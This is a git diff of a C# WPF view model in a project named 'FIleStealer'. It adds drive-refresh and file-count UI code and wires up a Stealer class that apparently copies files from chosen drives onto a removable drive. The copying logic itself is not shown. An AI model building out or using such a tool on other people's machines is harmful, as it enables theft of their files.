@@ -8,6 +8,8 @@ using System.Linq;
 using System.Runtime.CompilerServices;
 using System.Text;
 using System.Threading.Tasks;
+using System.Windows;
+using System.Windows.Threading;
 
 namespace FIleStealer.ViewModels
 {
@@ -16,22 +18,31 @@ namespace FIleStealer.ViewModels
         private DriveInfo selectedDrive;
         private DriveInfo availableDrive;
         private DriveInfo availableRemovableDrive;
+        private string chosenFile;
+        private ulong countFiles;
+        private ulong totalCountFiles;
 
         public ObservableCollection<DriveInfo> AvailableDrivesList { get; set; }
         public ObservableCollection<DriveInfo> SelectedDrivesList { get; set; }
         public ObservableCollection<DriveInfo> AvailableRemovableDrivesList { get; set; }
+        public ObservableCollection<string> FoundedFiles { get; set; }
+        public ObservableCollection<string> ScanInfo { get; set; }
 
         public SelectedDriveVM()
         {
             AvailableDrivesList = Manager.GetListOfDrivers();
             SelectedDrivesList = new ObservableCollection<DriveInfo>();
             AvailableRemovableDrivesList = Manager.GetListOfRemovableDrivers();
+            ScanInfo = new ObservableCollection<string>();
+            FoundedFiles = new ObservableCollection<string>();
         }
 
         #region Commands
         private ButtonCommand addCommand;
         private ButtonCommand removeCommand;
         private ButtonCommand startCommand;
+        private ButtonCommand refreshCommand;
+
         public ButtonCommand AddCommand
         {
             get
@@ -78,6 +89,10 @@ namespace FIleStealer.ViewModels
                   (startCommand = new ButtonCommand(obj =>
                   {
                       Stealer stealer = new Stealer(AvailableRemovableDrive, SelectedDrivesList.ToArray(), WriteInfo);
+                      stealer.DriveChanged += DriveInfoChanged;
+                      stealer.CountFilesChanged += CountChanged;
+                      stealer.TotalCountFilesChanged += TotalCountChanged;
+                      stealer.StealAsync();
                   }, 
                   (obj) =>
                   {
@@ -86,6 +101,22 @@ namespace FIleStealer.ViewModels
                       return true;
                   }
                   ));
+            }
+        }
+
+        public ButtonCommand RefreshCommand
+        {
+            get
+            {
+                return refreshCommand ??
+                  (refreshCommand = new ButtonCommand(obj =>
+                  {
+                      AvailableRemovableDrivesList.Clear();
+                      foreach (DriveInfo drive in Manager.GetListOfRemovableDrivers())
+                      {
+                          AvailableRemovableDrivesList.Add(drive);
+                      }
+                  }));
             }
         }
         #endregion
@@ -110,6 +141,7 @@ namespace FIleStealer.ViewModels
                 OnPropertyChanged("AvailableDrive");
             }
         }
+
         public DriveInfo AvailableRemovableDrive
         {
             get { return availableRemovableDrive; }
@@ -117,6 +149,36 @@ namespace FIleStealer.ViewModels
             {
                 availableRemovableDrive = value;
                 OnPropertyChanged("AvailableRemovableDrive");
+            }
+        }
+
+        public string ChosenFile
+        {
+            get { return chosenFile; }
+            set
+            {
+                chosenFile = value;
+                OnPropertyChanged("ChosenFile");
+            }
+        }
+
+        public ulong CountFiles
+        {
+            get { return countFiles; }
+            set
+            {
+                countFiles = value;
+                OnPropertyChanged("CountFiles");
+            }
+        }
+
+        public ulong TotalCountFiles
+        {
+            get { return totalCountFiles; }
+            set
+            {
+                totalCountFiles = value;
+                OnPropertyChanged("TotalCountFiles");
             }
         }
         #endregion
@@ -133,7 +195,22 @@ namespace FIleStealer.ViewModels
         #region Necessary method
         public void WriteInfo(string info)
         {
+            FoundedFiles.Add(info);
+        }
 
+        private void DriveInfoChanged(object sender, DriveInformationEventArgs e)
+        { 
+            ScanInfo.Add(e.Information);
+        }
+
+        private void CountChanged(object sender, CountFilesEventArgs e)
+        {
+            CountFiles = e.Count;
+        }
+
+        private void TotalCountChanged(object sender, CountFilesEventArgs e)
+        {
+            TotalCountFiles = e.Count;
         }
         #endregion
     }
